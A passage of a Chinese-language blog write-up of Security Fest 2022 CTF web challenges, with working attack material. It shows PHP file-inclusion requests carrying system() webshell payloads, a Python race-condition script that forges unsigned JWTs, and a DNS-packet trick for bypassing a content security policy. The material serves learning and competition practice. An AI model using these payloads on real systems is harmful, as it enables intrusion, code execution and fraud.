+<p>然后接了这么一句话 不知道有什么深意</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* nothing chall related here, I hope */</span></span><br></pre></td></tr></table></figure>
+
+<p>在<code>php</code>中间加了一堆html元素？？？</p>
+<p>猜测一波 这点与绕过<code>open_basedir</code> 有关?</p>
+<p>来仔细看一下这个上传文件的操作</p>
+<p>然后我们就是要绕过 <code>nohack</code> 但是 emmm</p>
+<p>为啥传什么进去都是string啊  草  怎么搞</p>
+<p>因为他这里最后是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>突然想到 他不允许我远程包含 但是我可以本地包含呀</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="regexp">//</span>text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOz8+</span><br></pre></td></tr></table></figure>
+
+<p>我们能不能把这个base64给写到本地去。然后再请求 include 去包含它</p>
+<p>直接由 <code>input://</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?file=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>dumperignon-01.hackaplaneten.se</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://dumperignon-01.hackaplaneten.se/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"></span><br><span class="line"><span class="language-php">a=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;./flag_dispenser&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>**<code>php://</code>****在<code>allow_url_fopen</code>，<code>allow_url_include</code>都关闭的情况下可以正常使用</p>
+<p>看了看maple大哥的wp （比我的麻烦 嘻嘻</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxPD9waHAgc3lzdGVtKCRfR0VUWzBdKTsvL3R4</span><br><span class="line">http:<span class="regexp">//</span>dumperignon-<span class="number">01</span>.hackaplaneten.se<span class="regexp">/?file=php:/</span><span class="regexp">/filter/</span>convert.base64-decode<span class="regexp">/resource=/</span>var<span class="regexp">/www/m</span>essages<span class="regexp">/e8c2ef8ec46207240b47fd7905b70ede842.msg&amp;0=./</span>flag_dispenser</span><br></pre></td></tr></table></figure>
+
+<h3 id="nofkntax-all-web-is-guess"><a href="#nofkntax-all-web-is-guess" class="headerlink" title="nofkntax(all,web,is,guess?)"></a>nofkntax(all,web,is,guess?)</h3><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://nofkntax.pwn.so:45246/</span><br><span class="line">Tax or haxx? Choose your destiny. Please note: the database is reset once an hour.</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>guess?</p>
+<p>那我们就来guess guess</p>
+<p>要买flag</p>
+<p>要很多前</p>
+<p>估计要搞数据库</p>
+<p>那应该要注入</p>
+<p>有个tip</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/account/tip</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>nofkntax.pwn.so:45246</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>167</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://nofkntax.pwn.so:45246</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://nofkntax.pwn.so:45246/account</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>acct=ba814cf1894723fbf12ba2546352a4b784dbb613</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">amount</span>=<span class="number">1</span>&amp;dest=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZGRyZXNzIjoiMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMCJ9.k6JoCG270Us_AO9vE0JWgi6M2PZMZ8whQZSdUbGNftk</span></span><br></pre></td></tr></table></figure>
+
+<p>Cookie: acct=ba814cf1894723fbf12ba2546352a4b784dbb613</p>
+<p>咋感觉这个cookie一直都没变。。。</p>
+<p><img src="/2022/06/02/Security-Fest-2022/image-20220603162315060.png" alt="image-20220603162315060"></p>
+<p>购买成功的cookie</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: acct=<span class="number">1</span>e<span class="number">4</span>d<span class="number">366</span>d<span class="number">7351275407</span>c<span class="number">50</span>d<span class="number">67666</span>e<span class="number">4715</span>d<span class="number">18</span>a<span class="number">0897</span>; msg=Q<span class="number">29</span>uZ<span class="number">3</span>JhdH<span class="attr">VsYXRpb25</span>zLCB<span class="number">5</span>b<span class="number">3</span>Uga<span class="symbol">nVzdCBib3</span>V<span class="symbol">naHQgYSB0</span>aGluZyE<span class="meta">%</span><span class="number">3</span>D</span><br></pre></td></tr></table></figure>
+
+<p>Congratulations, you just bought a thing!</p>
+<p>在这个数的时候还可以发 1000000000000000000</p>
+<p>但是多一个0都不行 </p>
+<p>other’s sol</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_jwt</span>(<span class="params">acct</span>):</span><br><span class="line"></span><br><span class="line">    jwt_prefix = <span class="string">&quot;eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0&quot;</span></span><br><span class="line">    jwt_payload = base64.standard_b64encode(json.dumps(&#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: acct,</span><br><span class="line">    &#125;).encode()).decode().replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jwt_prefix + <span class="string">&quot;.&quot;</span> + jwt_payload + <span class="string">&quot;.&quot;</span></span><br><span class="line"></span><br><span class="line">sess_a = requests.session()</span><br><span class="line">sess_a.headers.update(&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;A&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">sess_b = requests.session()</span><br><span class="line">sess_b.headers.update(&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;B&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">resp = sess_a.get(<span class="string">&quot;http://nofkntax.pwn.so:45246/account&quot;</span>, )</span><br><span class="line">resp = sess_b.get(<span class="string">&quot;http://nofkntax.pwn.so:45246/account&quot;</span>, )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jwt_a = get_jwt(sess_a.cookies[<span class="string">&#x27;acct&#x27;</span>])</span><br><span class="line">jwt_b = get_jwt(sess_b.cookies[<span class="string">&#x27;acct&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        s = sess_a</span><br><span class="line">        tip_jwt = jwt_b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = sess_b</span><br><span class="line">        tip_jwt = jwt_a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    os.system(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">curl --request POST \</span></span><br><span class="line"><span class="string">  --url http://nofkntax.pwn.so:45246/account/tip \</span></span><br><span class="line"><span class="string">  --header &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \</span></span><br><span class="line"><span class="string">  --header &#x27;User-Agent: <span class="subst">&#123;s.headers[<span class="string">&#x27;User-Agent&#x27;</span>]&#125;</span>&#x27; \</span></span><br><span class="line"><span class="string">  --data amount=<span class="subst">&#123;<span class="number">2</span>**i&#125;</span> \</span></span><br><span class="line"><span class="string">  --data dest=<span class="subst">&#123;tip_jwt&#125;</span> &amp;</span></span><br><span class="line"><span class="string">curl --request POST \</span></span><br><span class="line"><span class="string">  --url http://nofkntax.pwn.so:45246/account/tip \</span></span><br><span class="line"><span class="string">  --header &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \</span></span><br><span class="line"><span class="string">  --header &#x27;User-Agent: <span class="subst">&#123;s.headers[<span class="string">&#x27;User-Agent&#x27;</span>]&#125;</span>&#x27; \</span></span><br><span class="line"><span class="string">  --data amount=<span class="subst">&#123;<span class="number">2</span>**i&#125;</span> \</span></span><br><span class="line"><span class="string">  --data dest=<span class="subst">&#123;tip_jwt&#125;</span> &amp;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(resp.status_code)</span><br><span class="line">    <span class="built_in">print</span>(resp.text)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">GET /account</span></span><br><span class="line"><span class="string">    &lt;li&gt;</span></span><br><span class="line"><span class="string">        &lt;span class=&quot;item&quot;&gt;&lt;img src=&quot;/assets/img/items/4.gif&quot; alt=&quot;SECFEST&#123;7h1s_NFT_stUfF_1s_4_r4T_r4C3&#125;&quot; width=&quot;70&quot; height=&quot;70&quot; /&gt;&lt;/span&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;SECFEST&#123;7h1s_NFT_stUfF_1s_4_r4T_r4C3&#125;&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;&lt;strong class=&quot;small-price&quot;&gt;₳65536.00&lt;/strong&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/li&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="Madness"><a href="#Madness" class="headerlink" title="Madness"></a>Madness</h3><p>所以这题的flag在哪。草</p>
+<p>没看懂哇</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, make_response, render_template, request, redirect</span><br><span class="line"><span class="keyword">import</span> dns.resolver</span><br><span class="line"><span class="keyword">from</span> werkzeug.urls <span class="keyword">import</span> url_fix</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">app = Flask(__name__, static_url_path=<span class="string">&quot;/app/static&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> path == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/app&quot;</span>, code=<span class="number">301</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, prefix=<span class="string">&quot;/&quot;</span>+request.path.lstrip(<span class="string">&quot;/&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/app/api/lookup/&lt;string:domain&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lookup</span>(<span class="params">domain</span>):</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">r&quot;^[a-z.-]+$&quot;</span>, domain):</span><br><span class="line">        my_resolver = dns.resolver.Resolver()</span><br><span class="line">        my_resolver.nameservers = [<span class="string">&#x27;1.1.1.1&#x27;</span>]</span><br><span class="line">        out = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> my_resolver.query(domain, <span class="string">&#x27;A&#x27;</span>):</span><br><span class="line">                out.append(<span class="built_in">str</span>(item))</span><br><span class="line">            <span class="keyword">return</span> make_response(jsonify(&#123;<span class="string">&quot;status&quot;</span>:<span class="string">&quot;OK&quot;</span>, <span class="string">&quot;result&quot;</span>:out&#125;))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> make_response(jsonify(&#123;<span class="string">&quot;status&quot;</span>:<span class="string">&quot;ERROR&quot;</span>, <span class="string">&quot;result&quot;</span>:<span class="built_in">str</span>(e)&#125;))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        e = <span class="string">&quot;invalid domain (^[a-z.-]+) &#123;&#125;&quot;</span>.<span class="built_in">format</span>(domain)</span><br><span class="line">        <span class="keyword">return</span> make_response(jsonify(&#123;<span class="string">&quot;status&quot;</span>:<span class="string">&quot;ERROR&quot;</span>, <span class="string">&quot;result&quot;</span>:<span class="built_in">str</span>(e)&#125;))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_header</span>(<span class="params">response</span>):</span><br><span class="line">    response.headers[<span class="string">&#x27;X-Frame-Options&#x27;</span>] = <span class="string">&#x27;DENY&#x27;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;X-Content-Type-Options&#x27;</span>] = <span class="string">&#x27;nosniff&#x27;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="string">&quot;default-src &#x27;self&#x27; cloudflare-dns.com; img-src *&quot;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/02/Security-Fest-2022/image-20220603001238754.png" alt="image-20220603001238754" style="zoom: 50%;">
+
+<p>奇怪的xss</p>
+<p>csp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">response.headers[<span class="string">&#x27;X-Frame-Options&#x27;</span>] = <span class="string">&#x27;DENY&#x27;</span></span><br><span class="line">response.headers[<span class="string">&#x27;X-Content-Type-Options&#x27;</span>] = <span class="string">&#x27;nosniff&#x27;</span></span><br><span class="line">response.headers[<span class="string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="string">&quot;default-src &#x27;self&#x27; cloudflare-dns.com; img-src *&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/02/Security-Fest-2022/image-20220603004126183.png" alt="image-20220603004126183"></p>
+<p>看一下 这个 <code>cloudflare-dns.com</code> 啥意思</p>
+<img src="/2022/06/02/Security-Fest-2022/image-20220603001837561.png" alt="image-20220603001837561" style="zoom:67%;">
+
+<p>想要整xss 不知道这个<code> href</code> 有没有什么用</p>
+<p>这个path 其实是没有被过滤的</p>
+<p>我们可以控制这个路径</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;/fuckyou/2333/static/style.css&quot;</span>&gt;&lt;/link&gt;</span><br><span class="line">&lt;script <span class="attribute">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attribute">src</span>=<span class="string">&quot;/fuckyou/2333/static/dns.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先看一下这个<code>lookup</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/app/api/lookup/&lt;string:domain&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lookup</span>(<span class="params">domain</span>):</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">r&quot;^[a-z.-]+$&quot;</span>, domain):</span><br><span class="line">        my_resolver = dns.resolver.Resolver()</span><br><span class="line">        my_resolver.nameservers = [<span class="string">&#x27;1.1.1.1&#x27;</span>]</span><br><span class="line">        out = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> my_resolver.query(domain, <span class="string">&#x27;A&#x27;</span>):</span><br><span class="line">                out.append(<span class="built_in">str</span>(item))</span><br><span class="line">            <span class="keyword">return</span> make_response(jsonify(&#123;<span class="string">&quot;status&quot;</span>:<span class="string">&quot;OK&quot;</span>, <span class="string">&quot;result&quot;</span>:out&#125;))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> make_response(jsonify(&#123;<span class="string">&quot;status&quot;</span>:<span class="string">&quot;ERROR&quot;</span>, <span class="string">&quot;result&quot;</span>:<span class="built_in">str</span>(e)&#125;))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        e = <span class="string">&quot;invalid domain (^[a-z.-]+) &#123;&#125;&quot;</span>.<span class="built_in">format</span>(domain)</span><br><span class="line">        <span class="keyword">return</span> make_response(jsonify(&#123;<span class="string">&quot;status&quot;</span>:<span class="string">&quot;ERROR&quot;</span>, <span class="string">&quot;result&quot;</span>:<span class="built_in">str</span>(e)&#125;))</span><br></pre></td></tr></table></figure>
+
+<p>我们可能要学习一下 xss via dns</p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/tenable-techblog/cross-site-scripting-via-whois-and-dns-records-a25c33667fff">https://medium.com/tenable-techblog/cross-site-scripting-via-whois-and-dns-records-a25c33667fff</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.apnic.net/2022/02/22/resurrection-of-injection-attacks/">https://blog.apnic.net/2022/02/22/resurrection-of-injection-attacks/</a></p>
+<img src="/2022/06/02/Security-Fest-2022/image-20220603150802759.png" alt="image-20220603150802759" style="zoom:50%;">
+
+<p>有点像</p>
+<p>我还找到了这个</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#third-party-endpoints-+-jsonp">https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#third-party-endpoints-+-jsonp</a></p>
+<p>不太行 没啥 jsonp</p>
+<p><img src="/2022/06/02/Security-Fest-2022/image-20220603155219679.png" alt="image-20220603155219679"></p>
+<p>maple大哥的解</p>
+<blockquote>
+<p>很明顯是要在 <code>cloudflare-dns.com</code> 上面找到 endpoint 可以回傳自訂的 payload。</p>
+<p>後來查一查官方文件看到了這個: <a target="_blank" rel="noopener" href="https://developers.cloudflare.com/1.1.1.1/encryption/dns-over-https/make-api-requests/dns-wireformat/">Using DNS Wireformat</a></p>
+<p>它能讓你直接把 DNS 的 packet 用 base64 encode 放在 url 上傳送，然後回傳值是直接 binary DNS response。所以可以看看有沒有什麼方法能讓 DNS response 變成 js 來繞 CSP。</p>
+</blockquote>
+<blockquote>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> dnslib <span class="keyword">import</span> DNSRecord, DNSQuestion, DNSHeader</span><br><span class="line"></span><br><span class="line">pkt = DNSRecord(DNSHeader(id=<span class="number">0x2F2A</span>), q=DNSQuestion(<span class="string">&quot;*/alert(1)//&quot;</span>))</span><br><span class="line">b64encode(pkt.pack())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># http:<span class="comment">//madness-01.hackaplaneten.se:3000/%5Ccloudflare-dns.com/dns-query%3Fdns%3DLyoBAAABAAAAAAAADCovYWxlcnQoMSkvLwAAAQAB%23</span></span><br><span class="line"># SECFEST&#123;l00kz_l13K_JS_2_m3!?&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>b1ue0cean
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="http://example.com/2022/06/02/Security-Fest-2022/" title="Security Fest 2022 wp">http://example.com/2022/06/02/Security-Fest-2022/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="https://twitter.com/b1ue0cean7">
+          <span class="icon">
+            <i class="fab fa-twitter"></i>
+          </span>
+
+          <span class="label">Twitter</span>
+        </a>
+      </div>
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class=""></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/06/02/IOT-knowledge/" rel="prev" title="IOT base knowledge">
+                  <i class="fa fa-chevron-left"></i> IOT base knowledge
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/06/06/app-crack/" rel="next" title="AppCracker -- Widespread Vulnerabilities in User paper note and Session Authentication in Mobile Apps">
+                  AppCracker -- Widespread Vulnerabilities in User paper note and Session Authentication in Mobile Apps <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
